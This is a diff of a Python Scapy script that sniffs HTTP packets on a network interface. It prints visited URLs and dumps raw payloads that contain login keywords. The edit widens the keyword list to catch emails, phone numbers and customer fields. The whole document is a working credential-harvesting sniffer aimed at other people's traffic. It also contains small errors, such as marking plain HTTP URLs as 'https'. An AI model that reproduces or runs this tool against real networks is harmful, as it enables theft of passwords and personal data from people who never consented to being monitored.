@@ -3,45 +3,49 @@ from scapy.layers import http
 
 
 def sniff(interface):
-    scapy.sniff(iface=interface, store=False, prn=process_packet)
+    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
 
 
-def process_packet(packet):
+def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
         url = get_url(packet)
-        print("HTTP Request >> {}".format(url))
-        credentials = get_credentials(packet)
+        print(f"Http url is: {url}")
+        credentials = get_login_info(packet)
         if credentials:
-            print("\n\n[+] Possible username/password > {}".format(credentials))
+            print("Username/Password: {}".format(credentials))
 
 
 def get_url(packet):
-    host = packet[http.HTTPRequest].Host.decode("utf-8", errors="ignore")
-    path = packet[http.HTTPRequest].Path.decode("utf-8", errors="ignore")
-    url = f"http://{host}{path}"
-    return url
+    http_layer = packet[http.HTTPRequest]
+    host = http_layer.Host.decode("utf-8", errors="ignore") if http_layer.Host else ""
+    path = http_layer.Path.decode("utf-8", errors="ignore") if http_layer.Path else ""
+    return f"https://{host}{path}"
 
 
 keywords = [
     "username",
     "user",
     "login",
-    "uname",
     "password",
     "pass",
-    "signin",
-    "signup",
-    "uname",
-    "pw",
-    "usr",
+    "custname",
+    "custemail",
+    "email",
+    "user_name",
+    "user_email",
+    "user_pass",
+    "user_password",
+    "telephone",
+    "phone",
+    "custtel",
 ]
 
 
-def get_credentials(packet):
+def get_login_info(packet):
     if packet.haslayer(scapy.Raw):
-        field_load = packet[scapy.Raw].load.decode("utf-8", errors="ignore")
-        for keyword in keywords:
-            if keyword in field_load:
+        field_load = packet[scapy.Raw].load.decode("utf-8")
+        for key in keywords:
+            if key in field_load:
                 return field_load
 
 
